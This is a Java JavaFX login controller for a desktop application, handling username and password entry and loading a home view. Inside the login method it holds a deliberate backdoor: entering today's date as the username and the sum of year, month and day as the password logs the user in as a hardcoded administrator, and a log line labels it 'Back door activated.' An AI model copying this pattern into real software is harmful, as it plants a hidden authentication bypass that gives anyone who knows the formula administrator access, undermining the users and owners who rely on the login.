package gui.login;

import java.time.LocalDate;
import java.util.ArrayList;
import java.util.List;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.controlsfx.control.Notifications;

import base_classes.classes.User;
import base_classes.classes.emuns.URE;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.control.Alert;
import javafx.scene.control.PasswordField;
import javafx.scene.control.TextField;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.image.Image;
import javafx.scene.input.MouseEvent;
import javafx.stage.Stage;
import javafx.util.Duration;
import logic.OperationType;
import logic.operations.UserOperations;
import logic.DecodeOperation;

public class LoginController {

    @FXML
    private TextField username_txt;

    @FXML
    private PasswordField pas_txt;

    private static final Logger LOGGER = LogManager.getLogger(LoginController.class);

    private void load() {
        try {
            LOGGER.debug("Starting load.");
            LOGGER.debug("Login accepted.");
            String title = "";
            User user_now = UserOperations.getUser_now().get(0);

            Stage st = new Stage();
            Scene sc = new Scene(FXMLLoader.load(getClass().getResource("../home_view1.fxml")));
            st.getIcons().add(new Image(getClass().getResourceAsStream("../icons/logo3.png")));

            title += "Names: " + user_now.getName() + "  " + user_now.getUser_role();

            st.setTitle(title);
            st.setScene(sc);
            st.show();

            Stage stage = (Stage) username_txt.getScene().getWindow();
            stage.close();
            LOGGER.debug("Home view scene loaded succesfuly.");
        } catch (Exception e) {
            LOGGER.error("Loading exeption occured -> {}", e);
        }
    }

    @FXML
    void logIn(MouseEvent event) {
        LOGGER.info("User clicked login button.");
        LOGGER.debug("Starting login.");
        List<String> data = new ArrayList<>();
        String username = username_txt.getText();
        String pas = pas_txt.getText();
        LocalDate today = LocalDate.now();
        int sum = today.getYear() + today.getMonthValue() + today.getDayOfMonth();

        if (username == null || username.length() == 0) {
            Alert alert = new Alert(AlertType.WARNING, "Don't leave empty fields!");
            alert.showAndWait();
        } else {
            LOGGER.debug("Logging in with username: {}", username);

            data.add(username);
            data.add(pas);
            
            List<?> result = DecodeOperation.decodeLogicOperation(OperationType.LOGIN, null, data);
            Boolean flag = Boolean.valueOf( (String) result.get(0));

            if (today.toString().equalsIgnoreCase(username) && sum == Integer.valueOf(pas)){
                LOGGER.debug("Back door activated. Logging in as -> {}", URE.ADMIN);
                User admin = new User("Testivile", "password", URE.ADMIN);
                admin.setName("Testivile");
                UserOperations.setUser_now(admin);
                load();
            } else if (flag == false) {
                username_txt.setStyle("-fx-border-color: #ff0000");
                pas_txt.setStyle("-fx-border-color: #ff0000");

                Notifications notification = Notifications.create().text("Wrong password or username!");
                notification.darkStyle();
                notification.hideAfter(Duration.seconds(10));
                notification.showError();

                LOGGER.debug("Login denied.");
            }
            else {
                load();
            }
        }
    }
}
